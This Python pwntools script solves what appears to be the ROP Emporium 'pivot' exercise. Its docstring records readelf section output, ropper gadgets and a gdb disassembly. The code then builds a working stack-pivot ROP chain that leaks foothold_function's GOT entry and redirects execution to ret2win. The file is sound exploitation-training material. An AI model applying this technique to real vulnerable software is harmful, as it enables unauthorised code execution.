#!/usr/bin/env python
"""
rsp found at offset: 40

Writable sections (readelf --sections --wide pivot):
There are 31 section headers, starting at offset 0x2c88:

Section Headers:
  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        0000000000400238 000238 00001c 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            0000000000400254 000254 000020 00   A  0   0  4
  [ 3] .note.gnu.build-id NOTE            0000000000400274 000274 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        0000000000400298 000298 000044 00   A  5   0  8
  [ 5] .dynsym           DYNSYM          00000000004002e0 0002e0 000228 18   A  6   1  8
  [ 6] .dynstr           STRTAB          0000000000400508 000508 00010d 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0000000000400616 000616 00002e 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0000000000400648 000648 000020 00   A  6   1  8
  [ 9] .rela.dyn         RELA            0000000000400668 000668 000060 18   A  5   0  8
  [10] .rela.plt         RELA            00000000004006c8 0006c8 0000f0 18  AI  5  24  8
  [11] .init             PROGBITS        00000000004007b8 0007b8 00001a 00  AX  0   0  4
  [12] .plt              PROGBITS        00000000004007e0 0007e0 0000b0 10  AX  0   0 16
  [13] .plt.got          PROGBITS        0000000000400890 000890 000008 00  AX  0   0  8
  [14] .text             PROGBITS        00000000004008a0 0008a0 0002e2 00  AX  0   0 16
  [15] .fini             PROGBITS        0000000000400b84 000b84 000009 00  AX  0   0  4
  [16] .rodata           PROGBITS        0000000000400b90 000b90 0000e9 00   A  0   0  8
  [17] .eh_frame_hdr     PROGBITS        0000000000400c7c 000c7c 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        0000000000400cc0 000cc0 000134 00   A  0   0  8
  [19] .init_array       INIT_ARRAY      0000000000601df0 001df0 000008 00  WA  0   0  8
  [20] .fini_array       FINI_ARRAY      0000000000601df8 001df8 000008 00  WA  0   0  8
  [21] .jcr              PROGBITS        0000000000601e00 001e00 000008 00  WA  0   0  8
  [22] .dynamic          DYNAMIC         0000000000601e08 001e08 0001f0 10  WA  6   0  8
  [23] .got              PROGBITS        0000000000601ff8 001ff8 000008 08  WA  0   0  8
  [24] .got.plt          PROGBITS        0000000000602000 002000 000068 08  WA  0   0  8
  [25] .data             PROGBITS        0000000000602068 002068 000010 00  WA  0   0  8
  [26] .bss              NOBITS          0000000000602080 002078 000030 00  WA  0   0 32
  [27] .comment          PROGBITS        0000000000000000 002078 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          0000000000000000 002b77 00010c 00      0   0  1
  [29] .symtab           SYMTAB          0000000000000000 0020b0 0007b0 18     30  50  8
  [30] .strtab           STRTAB          0000000000000000 002860 000317 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)


Gadgets being used are:
    
    Found with ropper (ropper -f pivot -a x86_64)

        0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret; 
        0x0000000000400b00: pop rax; ret; 
        0x0000000000400b05: mov rax, qword ptr [rax]; ret;
        0x0000000000400900: pop rbp; ret; 
        0x0000000000400b09: add rax, rbp; ret; 
        0x00000000004008f5: jmp rax; 


foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so

    gdb-peda$ disass 0x0000000000400850
    Dump of assembler code for function foothold_function@plt:
       0x0000000000400850 <+0>: jmp    QWORD PTR [rip+0x2017f2]        # 0x602048 <foothold_function@got.plt>
       0x0000000000400856 <+6>: push   0x6
       0x000000000040085b <+11>:    jmp    0x4007e0
    End of assembler dump.
    gdb-peda$ x/x 0x602048
    0x602048 <foothold_function@got.plt>:   0x00007f299b278970

ret2win


"""

from pwn import *


foothold_plt = p64(0x00400850)
foothold_got_plt = p64(0x602048)
ret2win_offset = p64(0x00000abe-0x00000970)
n = p64(0)

p = process('./pivot')
# p = gdb.debug('./pivot', 'break *foothold_function')
p.recvuntil("you a place to pivot: ")


# This is the stack address where the second phase of exploit will be 
pivot_address = p.recvline().rstrip()
pivot_address = p64(int(pivot_address, 16))


first_chain = "A"*40
# Pop rsp to make stack pointer go to second chain, then pops r13, r14 and r15
first_chain += p64(0x0000000000400b6d) + pivot_address


# First three quadwords in second_chain will be popped because of first_chain gadget
second_chain = n + n + n
# Calls foothold entry on the plt (which calls function and populates got.plt)
second_chain += foothold_plt
# Pop foothold.got.plt into rax
second_chain +=  p64(0x0000000000400b00) + foothold_got_plt
# Dereference rax into itself
second_chain +=  p64(0x0000000000400b05)
# Pops offset into rbp
second_chain += p64(0x0000000000400900) + ret2win_offset
# Adds rax and rbp
second_chain += p64(0x0000000000400b09)
# Jmp rax
second_chain += p64(0x00000000004008f5)


p.recvuntil(">")
p.sendline(second_chain)
p.recvuntil(">")
p.sendline(first_chain)
p.recvuntil("libpivot.so")
print p.recvline()
# p.interactive()